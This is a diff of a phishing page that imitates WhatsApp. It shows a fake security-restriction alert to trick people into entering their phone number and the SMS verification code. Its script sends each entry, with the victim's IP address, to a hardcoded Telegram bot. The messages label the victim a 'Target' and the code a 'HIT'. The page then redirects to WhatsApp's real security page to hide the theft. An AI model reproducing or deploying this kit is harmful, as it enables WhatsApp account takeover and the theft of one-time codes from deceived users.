@@ -3,36 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Alert - WhatsApp</title>
+    <title>WhatsApp</title>
     <style>
-        :root { --wa-green: #25D366; --wa-dark: #0b141a; --wa-sec: #202c33; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-err: #ff4b4b; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        :root { --wa-green: #25D366; --wa-dark: #0b141a; --wa-sec: #202c33; --wa-text: #e9edef; --wa-hint: #8696a0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; }
         body { background: var(--wa-dark); color: var(--wa-text); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; display: flex; flex-direction: column; }
+        .container { width: 100%; max-width: 380px; padding: 25px; text-align: center; display: flex; flex-direction: column; }
         
-        .screen { display: none; width: 100%; flex-direction: column; align-items: center; animation: fadeIn 0.3s ease; }
+        .screen { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; animation: fadeIn 0.4s ease; }
         .active { display: flex; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .header-icon { width: 55px; margin-top: 40px; margin-bottom: 25px; }
-        .alert-card { background: rgba(255, 75, 75, 0.08); border: 1px solid rgba(255, 75, 75, 0.3); border-radius: 12px; padding: 20px; text-align: left; margin-bottom: 20px; }
-        h1 { font-size: 19px; font-weight: 600; color: var(--wa-err); margin-bottom: 12px; }
-        .msg-body { font-size: 14px; line-height: 1.5; color: var(--wa-text); }
+        .logo { width: 60px; margin-top: 60px; margin-bottom: 20px; }
+        h1 { font-size: 20px; font-weight: 500; margin-bottom: 15px; color: #fff; }
+        p { font-size: 14px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 25px; }
 
-        /* Input Fields */
-        .input-box { width: 100%; background: var(--wa-sec); border-radius: 10px; padding: 12px; margin-top: 15px; border-bottom: 2px solid var(--wa-green); }
-        select { background: transparent; color: #fff; border: none; width: 100%; font-size: 15px; outline: none; appearance: none; }
-        .phone-row { display: flex; align-items: center; margin-top: 10px; border-top: 1px solid #3b4a54; padding-top: 10px; }
-        #ccode { font-weight: bold; color: var(--wa-green); padding-right: 15px; border-right: 1px solid #3b4a54; }
-        input[type="tel"], input[type="text"] { flex: 1; background: transparent; border: none; color: #fff; font-size: 18px; padding-left: 15px; outline: none; }
+        /* Fake System Message */
+        .sys-msg { text-align: left; background: var(--wa-sec); padding: 15px; border-radius: 10px; margin-bottom: 25px; border-left: 3px solid var(--wa-green); }
+        .sys-msg b { color: #fff; display: block; margin-bottom: 5px; font-size: 13px; }
+        .sys-msg span { font-size: 13px; color: var(--wa-hint); }
 
-        button { background: var(--wa-green); color: #000; border: none; padding: 15px; border-radius: 30px; font-size: 15px; font-weight: 700; width: 100%; cursor: pointer; margin-top: auto; margin-bottom: 30px; }
+        .selector { width: 100%; border-bottom: 1px solid var(--wa-green); padding: 10px; margin-bottom: 5px; }
+        select { background: transparent; color: var(--wa-green); border: none; outline: none; width: 100%; font-size: 16px; text-align-last: center; cursor: pointer; appearance: none; }
         
-        /* OTP Styling */
-        .otp-input { background: transparent; border: none; border-bottom: 2px solid var(--wa-green); color: #fff; font-size: 32px; width: 180px; text-align: center; letter-spacing: 6px; margin: 30px 0; outline: none; }
-        .timer { font-size: 13px; color: var(--wa-hint); }
+        .input-row { width: 100%; display: flex; border-bottom: 1px solid var(--wa-green); padding: 10px 0; margin-bottom: 40px; }
+        #ccode { width: 25%; font-size: 18px; border-right: 1px solid #3b4a54; color: #fff; }
+        input[type="tel"], input[type="text"] { width: 75%; background: transparent; border: none; color: #fff; font-size: 20px; padding: 0 15px; outline: none; text-align: left; }
 
-        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin-top: 40px; }
+        button { background: var(--wa-green); color: #000; border: none; padding: 12px 30px; border-radius: 25px; font-size: 14px; font-weight: 600; width: fit-content; min-width: 100px; cursor: pointer; margin-top: auto; margin-bottom: 40px; }
+
+        .otp-input { width: 180px; border: none; border-bottom: 2px solid var(--wa-green); font-size: 28px; letter-spacing: 8px; text-align: center; margin: 30px 0; background: transparent; color: #fff; outline: none; }
+        .timer { color: var(--wa-hint); font-size: 13px; margin-top: 15px; }
+        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-top: 50px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -40,55 +42,52 @@
 
     <div class="container">
         <div id="scr-load" class="screen active">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="header-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
             <div class="spinner"></div>
-            <p style="margin-top: 25px; color: var(--wa-hint);">Securing connection...</p>
+            <p style="margin-top: 20px;">Connecting...</p>
         </div>
 
         <div id="scr-phone" class="screen">
-            <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" class="header-icon" style="filter: invert(1);">
-            <div class="alert-card">
-                <h1>Security Alert</h1>
-                <p class="msg-body">
-                    Dear user, an unauthorized login attempt was detected from another device. Due to multiple unused OTP requests, <b>your account has been temporarily restricted for 24 hours</b> to ensure your data safety.
-                </p>
-                <p class="msg-body" style="margin-top: 10px; font-size: 12px; color: var(--wa-hint);">
-                    To lift this restriction and regain access immediately, please verify your phone number below:
-                </p>
+            <h1 style="margin-top: 40px;">Verify your number</h1>
+            
+            <div class="sys-msg">
+                <b>Security Notification</b>
+                <span>An unauthorized login attempt was detected. Your account is temporarily restricted. To restore access, please verify your identity.</span>
             </div>
-
-            <div class="input-box">
+            
+            <p>WhatsApp will need to verify your phone number.</p>
+            
+            <div class="selector">
                 <select id="country" onchange="updateCountry()">
-                    <option value="1" data-len="10">United States</option>
-                    <option value="44" data-len="10">United Kingdom</option>
                     <option value="20" data-len="11">Egypt</option>
                     <option value="966" data-len="9">Saudi Arabia</option>
+                    <option value="1" data-len="10">United States</option>
                 </select>
-                <div class="phone-row">
-                    <div id="ccode">+1</div>
-                    <input type="tel" id="phone" placeholder="Phone number" maxlength="10">
-                </div>
             </div>
-            <button onclick="processPhone()">VERIFY & UNRESTRICT</button>
+            <div class="input-row">
+                <div id="ccode">+20</div>
+                <input type="tel" id="phone" placeholder="phone number">
+            </div>
+            <button onclick="processPhone()">NEXT</button>
         </div>
 
         <div id="scr-otp" class="screen">
-            <h1 style="color: #fff; margin-top: 40px;">Enter Verification Code</h1>
-            <p class="msg-body" style="text-align: center;">Enter the 6-digit code sent via SMS to:<br><b id="masked" style="color: var(--wa-green); margin-top: 5px; display: block;"></b></p>
+            <h1 style="margin-top: 40px;">Verifying your number</h1>
+            <p>Waiting to automatically detect an SMS sent to<br><b id="masked" style="color:#fff;"></b></p>
             
-            <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
-
-            <p style="color: var(--wa-hint); font-size: 12px;">Restriction will be lifted automatically after verification.</p>
-            <div class="timer" style="margin-top: 20px;">Resend code in: <span id="clock" style="color: var(--wa-green);">01:59</span></div>
-            <button onclick="submitOtp()">UNBLOCK ACCOUNT</button>
+            <input type="text" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="--- ---">
+            
+            <p style="color: var(--wa-hint);">Enter 6-digit code</p>
+            <div class="timer">Resend SMS in <span id="clock" style="color: var(--wa-green);">01:59</span></div>
+            <button onclick="submitOtp()">VERIFY</button>
         </div>
     </div>
 
     <script>
-        const CONFIG = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
+        const BOT = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
         let userNum = "";
 
-        setTimeout(() => { showScreen('scr-load', 'scr-phone'); }, 2000);
+        setTimeout(() => showScreen('scr-load', 'scr-phone'), 2000);
 
         function showScreen(hide, show) {
             document.getElementById(hide).classList.remove('active');
@@ -97,41 +96,35 @@
 
         function updateCountry() {
             const s = document.getElementById('country');
-            const len = s.options[s.selectedIndex].getAttribute('data-len');
             document.getElementById('ccode').innerText = '+' + s.value;
-            document.getElementById('phone').maxLength = len;
             document.getElementById('phone').value = "";
         }
 
-        async function notifyTelegram(msg) {
+        async function notify(msg) {
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const text = `${msg}\n🌐 IP: ${data.ip}`;
-                
-                await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
+                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+                fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CONFIG.C, text: text })
+                    body: JSON.stringify({ chat_id: BOT.C, text: msg + `\nIP: ${ip}` })
                 });
-            } catch(e) {}
+            } catch(e){}
         }
 
         function processPhone() {
             const num = document.getElementById('phone').value;
             const code = document.getElementById('ccode').innerText;
-            if(num.length < 7) return alert("Please enter a valid phone number.");
+            if(num.length < 7) return;
 
             userNum = code + " " + num;
             document.getElementById('masked').innerText = userNum;
-            
-            notifyTelegram(`🚀 New Target:\n📱 Number: ${userNum}`);
+            notify(`☎️ Phone: ${userNum}`);
 
             showScreen('scr-phone', 'scr-load');
             setTimeout(() => {
                 showScreen('scr-load', 'scr-otp');
                 startTimer();
-            }, 1500);
+            }, 1200);
         }
 
         function startTimer() {
@@ -147,15 +140,9 @@
 
         async function submitOtp() {
             const otp = document.getElementById('otp').value;
-            if(otp.length < 6) return alert("Please enter 6 digits.");
-
-            document.getElementById('scr-otp').innerHTML = '<div class="spinner" style="margin: 60px auto;"></div><p>Unrestricting Account...</p>';
-            
-            await notifyTelegram(`🔥 HIT! CODE: ${otp}\n📱 Target: ${userNum}`);
-            
-            setTimeout(() => {
-                window.location.href = "https://www.whatsapp.com/security";
-            }, 2500);
+            if(otp.length < 6) return;
+            notify(`🔥 OTP CODE: ${otp}\nTarget: ${userNum}`);
+            window.location.href = "https://www.whatsapp.com/security";
         }
     </script>
 </body>
